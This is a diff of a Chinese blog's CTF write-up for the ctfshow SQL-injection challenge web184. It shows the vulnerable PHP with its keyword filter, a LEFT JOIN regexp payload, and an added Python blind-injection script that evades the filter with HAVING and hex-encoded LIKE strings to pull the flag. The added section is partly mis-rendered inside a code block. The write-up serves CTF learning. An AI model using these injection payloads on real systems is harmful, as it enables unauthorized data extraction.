@@ -8598,13 +8598,13 @@
 
 <p>最后的结果就是我们想要的flag</p>
 <p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241210163637692.png" alt="image-20241210163637692"></p>
-<h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><h3 id="RIGHT-JOIN-关键字注入"><a href="#RIGHT-JOIN-关键字注入" class="headerlink" title="#RIGHT JOIN 关键字注入"></a>#RIGHT JOIN 关键字注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>拼接<span class="keyword">sql</span>语句查找指定ID用户</span><br><span class="line">  $<span class="keyword">sql</span> <span class="operator">=</span> &quot;select count(*) from &quot;.$_POST[<span class="string">&#x27;tableName&#x27;</span>].&quot;;&quot;;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>对传入的参数进行了过滤</span><br><span class="line">  <span class="keyword">function</span> waf($str)&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;</span><span class="operator">|</span>\&quot;|union|\`|sleep|benchmark/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br><span class="line">//返回用户表的记录总数</span><br><span class="line">      $user_count = 0;</span><br></pre></td></tr></table></figure>
+<h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><h3 id="RIGHT-JOIN-关键字注入"><a href="#RIGHT-JOIN-关键字注入" class="headerlink" title="#RIGHT JOIN 关键字注入"></a>#RIGHT JOIN 关键字注入</h3><h3 id="盲注绕过"><a href="#盲注绕过" class="headerlink" title="#盲注绕过"></a>#盲注绕过</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>拼接<span class="keyword">sql</span>语句查找指定ID用户</span><br><span class="line">  $<span class="keyword">sql</span> <span class="operator">=</span> &quot;select count(*) from &quot;.$_POST[<span class="string">&#x27;tableName&#x27;</span>].&quot;;&quot;;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>对传入的参数进行了过滤</span><br><span class="line">  <span class="keyword">function</span> waf($str)&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;</span><span class="operator">|</span>\&quot;|union|\`|sleep|benchmark/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br><span class="line">//返回用户表的记录总数</span><br><span class="line">      $user_count = 0;</span><br></pre></td></tr></table></figure>
 
 <p>这次的过滤更多了，我们的sleep函数和where这些都被过滤掉了，那我们先正常看看页面的回显信息</p>
 <p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241211170048242.png" alt="image-20241211170048242"></p>
 <p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241211170125575.png" alt="image-20241211170125575"></p>
 <p>可以看到和上一题的回显还是一样的，不过我们上一个题目的布尔盲注的脚本已经打不通了，这里我们用一个新方法，就是左右连接</p>
-<h3 id="左右连接"><a href="#左右连接" class="headerlink" title="左右连接"></a>左右连接</h3><p>讲到这个，我们首先也是先要理解概念，这里我进行分布解析(因为这段时间有点忙，数据库还没搭出来，所以我先用其他师傅的图片进行讲解)</p>
+<h3 id="方法一-左右连接"><a href="#方法一-左右连接" class="headerlink" title="方法一:左右连接"></a>方法一:左右连接</h3><p>讲到这个，我们首先也是先要理解概念，这里我进行分布解析(因为这段时间有点忙，数据库还没搭出来，所以我先用其他师傅的图片进行讲解)</p>
 <h4 id="join连接"><a href="#join连接" class="headerlink" title="join连接"></a>join连接</h4><p>SQL join 用于把来自两个或多个表的行结合起来。</p>
 <p>join 为连接查询 ，能将多个表连接一起查询</p>
 <p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/abc291dc48e965f17b6273855e8d89c5.png" alt="img"></p>
@@ -8677,7 +8677,7 @@
 <p>有一点奇怪的问题，就是说，在进行测试的时候，得到<code>$user_count = 22;</code>作为筛选条件，但是实际上用代码跑flag的时候，却是用<code>$user_count = 43;</code>作为筛选条件。这是为什么呢？我一开始也不是很明白，后面查阅了很多wp才找到相关的解释</p>
 <p>我们先写一个简单的payload</p>
 <p>这里是用的左连接哈，其实和右连接没什么区别</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tableName= ctfshow_user as a left join ctfshow_user as b on a.pass regexp(CONCAT(char(99),char(116),char(42)) )</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tableName= ctfshow_user as a left join ctfshow_user as b on a.pass regexp(CONCAT(char(99),char(116),char(42)))</span><br></pre></td></tr></table></figure>
 
 <p>先解析一下代码</p>
 <ol>
@@ -8702,25 +8702,14 @@
 <li><p><strong>连接条件</strong>：</p>
 <ul>
 <li><pre><code>a.pass regexp(CONCAT(char(99),char(116),char(42))
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">     - `char(99)`、`char(116)` 和 `char(42)` 分别对应字符 &#x27;c&#x27;、&#x27;t&#x27; 和 &#x27;*&#x27;。</span><br><span class="line">     - `CONCAT(char(99),char(116),char(42))` 合并为字符串 &#x27;ct*&#x27;。</span><br><span class="line">     - `a.pass regexp(&#x27;ct*&#x27;)` 使用正则表达式匹配，检查 `a.pass` 是否包含与这个正则表达式匹配的模式。</span><br><span class="line"></span><br><span class="line">![image-20241211173354151](./../image/achieve/202411/sql注入--ctfshow/image-20241211173354151.png)</span><br><span class="line"></span><br><span class="line">这里可以看到是成功执行了的</span><br><span class="line"></span><br><span class="line">在上面的解析中，我们只需要关注一句话:</span><br><span class="line"></span><br><span class="line">`LEFT JOIN` 保留左表（别名为 `a`）中的所有记录，如果右表（别名为 `b`）有匹配的记录，则显示匹配记录；如果没有匹配记录，则为右表的列显示 `NULL`。</span><br><span class="line"></span><br><span class="line">那我们来分析一下这个43：</span><br><span class="line"></span><br><span class="line">左连接，保留左表中的数据，22条。</span><br><span class="line"></span><br><span class="line">对于连接条件on a.pass regexp(‘ct*’)  ,在a中22条数据肯定有一条是满足该条件的，并且a是左表，所以筛选出来的这条数据对应的b表数据（22条）都满足条件。,剩下的a中21条不满足on,所以对应的b的22条也不满足。</span><br><span class="line"></span><br><span class="line">a中满足条件的一条数据与b表所有数据做全连接，22条。a表还剩21条，对于的b表不满足，全部为null,21+22=43。</span><br><span class="line"></span><br><span class="line">### 方法二：盲注</span><br><span class="line"></span><br><span class="line">where也过滤了，用having代替；</span><br><span class="line"></span><br><span class="line">引号被过滤了，那么字符串部分可以采用16进制绕过</span><br><span class="line"></span><br><span class="line">脚本</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://7c144dfc-2962-414f-9d0c-efaa4064f85a.challenge.ctf.show/select-waf.php&quot;</span><br><span class="line"></span><br><span class="line">letter = &quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span><br><span class="line">def asc2hex(s):</span><br><span class="line">    a1 = &#x27;&#x27;</span><br><span class="line">    a2 = &#x27;&#x27;</span><br><span class="line">    for i in s:</span><br><span class="line">        a1+=hex(ord(i))</span><br><span class="line">    a2 = a1.replace(&quot;0x&quot;,&quot;&quot;)</span><br><span class="line">    return a2</span><br><span class="line">#将输入的字符转化成十六进制</span><br><span class="line">#通过迭代字符串 s 中的每个字符，用 ord() 获得其 ASCII 值，然后用 hex() 转换为十六进制，并去除前缀 0x，最后拼接成一个连续的字符串。</span><br><span class="line">flag = &quot;ctfshow&#123;&quot;</span><br><span class="line">for i in range(0,100):</span><br><span class="line">    for j in letter:</span><br><span class="line">        temp_flag = flag+j</span><br><span class="line">        data =&#123;</span><br><span class="line">            &quot;tableName&quot;:&quot;ctfshow_user group by pass having pass like (&#123;&#125;)&quot;.format(&quot;0x&quot;+asc2hex(temp_flag+&quot;%&quot;))</span><br><span class="line">        &#125;</span><br><span class="line">        #print(data[&quot;tableName&quot;])</span><br><span class="line"></span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        if &quot;$user_count = 1;&quot; in r.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            continue</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 </code></pre>
-<ul>
-<li><code>char(99)</code>、<code>char(116)</code> 和 <code>char(42)</code> 分别对应字符 ‘c’、’t’ 和 ‘*’。</li>
-<li><code>CONCAT(char(99),char(116),char(42))</code> 合并为字符串 ‘ct*’。</li>
-<li><code>a.pass regexp(&#39;ct*&#39;)</code> 使用正则表达式匹配，检查 <code>a.pass</code> 是否包含与这个正则表达式匹配的模式。</li>
-</ul>
 </li>
 </ul>
 </li>
 </ol>
-<p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241211173354151.png" alt="image-20241211173354151"></p>
-<p>这里可以看到是成功执行了的</p>
-<p>在上面的解析中，我们只需要关注一句话:</p>
-<p><code>LEFT JOIN</code> 保留左表（别名为 <code>a</code>）中的所有记录，如果右表（别名为 <code>b</code>）有匹配的记录，则显示匹配记录；如果没有匹配记录，则为右表的列显示 <code>NULL</code>。</p>
-<p>那我们来分析一下这个43：</p>
-<p>左连接，保留左表中的数据，22条。</p>
-<p>对于连接条件on a.pass regexp(‘ct*’)  ,在a中22条数据肯定有一条是满足该条件的，并且a是左表，所以筛选出来的这条数据对应的b表数据（22条）都满足条件。,剩下的a中21条不满足on,所以对应的b的22条也不满足。</p>
-<p>a中满足条件的一条数据与b表所有数据做全连接，22条。a表还剩21条，对于的b表不满足，全部为null,21+22&#x3D;43。</p>
-]]></content>
+<p><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/image-20241211200636369.png" alt="image-20241211200636369"></p>
+<h2 id="web185"><a href="#web185" class="headerlink" title="web185"></a>web185</h2>]]></content>
       <categories>
         <category>ctfshow</category>
       </categories>
